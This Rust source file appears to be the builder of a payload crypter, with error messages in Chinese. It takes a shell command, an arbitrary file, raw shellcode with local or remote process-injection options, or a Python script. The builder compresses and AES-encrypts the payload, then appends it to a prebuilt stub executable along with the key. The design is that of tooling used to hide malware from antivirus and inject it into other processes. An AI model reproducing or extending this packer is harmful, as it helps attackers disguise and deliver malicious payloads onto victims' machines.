use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
use rand::{rngs::OsRng, RngCore};
use std::fs;
use std::path::{Path, PathBuf};

const MARKER: &[u8] = b"RSPKv1\0";

fn read_stub(default_release_first: bool) -> Result<Vec<u8>, String> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join("stub.exe"));
        }
    }
    // project-root relative
    if default_release_first {
        candidates.push(PathBuf::from("target/release/stub.exe"));
        candidates.push(PathBuf::from("target/debug/stub.exe"));
    } else {
        candidates.push(PathBuf::from("target/debug/stub.exe"));
        candidates.push(PathBuf::from("target/release/stub.exe"));
    }
    // current_dir relative
    if let Ok(cwd) = std::env::current_dir() {
        candidates.push(cwd.join("target/release/stub.exe"));
        candidates.push(cwd.join("target/debug/stub.exe"));
        candidates.push(cwd.join("stub.exe"));
    }
    for p in candidates {
        if p.exists() {
            return fs::read(&p).map_err(|e| format!("读取Stub失败: {}", e));
        }
    }
    Err("读取Stub失败: 未找到 stub.exe，请先构建：cargo build -p stub --release".to_string())
}

pub fn pack_cmd(cmd: &str, out_path: &Path) -> Result<(), String> {
    let mut payload = Vec::new();
    payload.extend_from_slice(b"CMD\0");
    payload.extend_from_slice(cmd.as_bytes());
    pack_payload(payload, out_path)
}

pub fn pack_file(input_path: &Path, out_path: &Path) -> Result<(), String> {
    let input = fs::read(input_path).map_err(|e| format!("读取输入失败: {}", e))?;
    pack_payload(input, out_path)
}

pub fn pack_shellcode(sc_path: &Path, out_path: &Path, inj_mode: &str, remote_path: Option<&Path>) -> Result<(), String> {
    let sc = fs::read(sc_path).map_err(|e| format!("读取Shellcode失败: {}", e))?;
    let mut payload = Vec::new();
    payload.extend_from_slice(b"SC\0");
    let mode = if inj_mode.eq_ignore_ascii_case("remote") { 1u8 } else { 0u8 };
    payload.push(mode);
    if mode == 1 {
        let p = remote_path.ok_or("远程注入需要提供目标进程路径")?;
        let s = p.to_string_lossy().into_owned();
        let bytes = s.as_bytes();
        payload.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
        payload.extend_from_slice(bytes);
    }
    payload.extend_from_slice(&(sc.len() as u32).to_le_bytes());
    payload.extend_from_slice(&sc);
    pack_payload(payload, out_path)
}

pub fn pack_shellcode_py(py_path: &Path, out_path: &Path) -> Result<(), String> {
    let script = fs::read_to_string(py_path).map_err(|e| format!("读取Python脚本失败: {}", e))?;
    let bytes = script.as_bytes();
    let mut payload = Vec::new();
    payload.extend_from_slice(b"PY\0");
    payload.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
    payload.extend_from_slice(bytes);
    pack_payload(payload, out_path)
}

fn pack_payload(payload: Vec<u8>, out_path: &Path) -> Result<(), String> {
    let compressed = zstd::encode_all(&payload[..], 3).map_err(|e| format!("压缩失败: {}", e))?;
    let stub = read_stub(true)?;
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);
    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| "cipher init fail".to_string())?;
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ciphertext = cipher.encrypt(nonce, compressed.as_ref()).map_err(|_| "加密失败".to_string())?;

    let mut out = stub;
    out.extend_from_slice(MARKER);
    out.extend_from_slice(&(32u32).to_le_bytes());
    out.extend_from_slice(&key);
    out.extend_from_slice(&(12u32).to_le_bytes());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&(ciphertext.len() as u64).to_le_bytes());
    out.extend_from_slice(&ciphertext);
    fs::write(out_path, &out).map_err(|e| format!("写入输出失败: {}", e))
}
